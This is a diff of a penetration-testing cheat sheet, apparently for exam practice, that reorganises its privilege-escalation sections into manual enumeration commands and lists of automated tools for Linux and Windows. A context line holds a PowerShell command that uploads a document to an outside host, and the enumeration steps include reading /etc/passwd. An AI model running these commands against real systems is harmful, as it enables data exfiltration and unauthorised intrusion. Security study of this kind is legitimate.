@@ -117,30 +117,73 @@
   powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
   ```
     
-## **Linux Privilege Escalation**
+## **Privilege Escalation**
+### General commands
+  - **whoami**
+  - **hostname**
+### **Linux**
 
-- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
-- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-- [Linux Smart Enum](https://github.com/diego-treitos/linux-smart-enumeration)
-- [LinEnum](https://github.com/rebootuser/LinEnum)
-- [BeRoot](https://github.com/AlessandroZ/BeRoot)
-- [LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
-- [Unix Privesc Check](https://github.com/pentestmonkey/unix-privesc-check)
-- [Privilage Escalation through sudo](https://github.com/TH3xACE/SUDO_KILLER)
+- **Manually**
+  - More user information
+    ```bash
+    id
+    ```
+  - Enumerate users
+    ```bash
+    cat /etc/passwd
+    ```
+  - System Information
+    ```bash
+    cat /etc/issue
+    ```
+    ```bash
+    cat /etc/*-release
+    ```
+    ```bash
+    uname -a
+    ```
+    
+- **Automated**
+  - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+  - [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+  - [Linux Smart Enum](https://github.com/diego-treitos/linux-smart-enumeration)
+  - [LinEnum](https://github.com/rebootuser/LinEnum)
+  - [BeRoot](https://github.com/AlessandroZ/BeRoot)
+  - [LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
+  - [Unix Privesc Check](https://github.com/pentestmonkey/unix-privesc-check)
+  - [Privilage Escalation through sudo](https://github.com/TH3xACE/SUDO_KILLER)
 
-## **Windows Privilege Escalation**
+### **Windows**
 
-- [PowerSploit's Power Up](https://github.com/PowerShellMafia/PowerSploit)
-- [Watson](https://github.com/rasta-mouse/Watson)
-- [Sherlock](https://github.com/rasta-mouse/Sherlock)
-- [BeRoot](https://github.com/AlessandroZ/BeRoot)
-- [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
-- [Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)
-- [Windows Exploits](https://github.com/abatchy17/WindowsExploits)
-- [Windows Enum](https://github.com/absolomb/WindowsEnum)
-- [SeatBelt](https://github.com/GhostPack/Seatbelt)
-- [Powerless](https://github.com/M4ximuss/Powerless)
-- [JAWS](https://github.com/411Hall/JAWS)
-- [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
-- [Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
-- [Privesc Check](https://github.com/itm4n/PrivescCheck)
+- **Manually**
+  - More user information
+    ```bash
+    net user <USER>
+    ```
+    It gaves us more information about the target as which groups the user belongs to.
+  - Discover more users
+    ```bash
+    net user
+    ```
+  - System information
+    ```bash
+    systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+    ```
+    
+  
+
+- **Automated**
+  - [PowerSploit's Power Up](https://github.com/PowerShellMafia/PowerSploit)
+  - [Watson](https://github.com/rasta-mouse/Watson)
+  - [Sherlock](https://github.com/rasta-mouse/Sherlock)
+  - [BeRoot](https://github.com/AlessandroZ/BeRoot)
+  - [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
+  - [Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)
+  - [Windows Exploits](https://github.com/abatchy17/WindowsExploits)
+  - [Windows Enum](https://github.com/absolomb/WindowsEnum)
+  - [SeatBelt](https://github.com/GhostPack/Seatbelt)
+  - [Powerless](https://github.com/M4ximuss/Powerless)
+  - [JAWS](https://github.com/411Hall/JAWS)
+  - [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
+  - [Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
+  - [Privesc Check](https://github.com/itm4n/PrivescCheck)
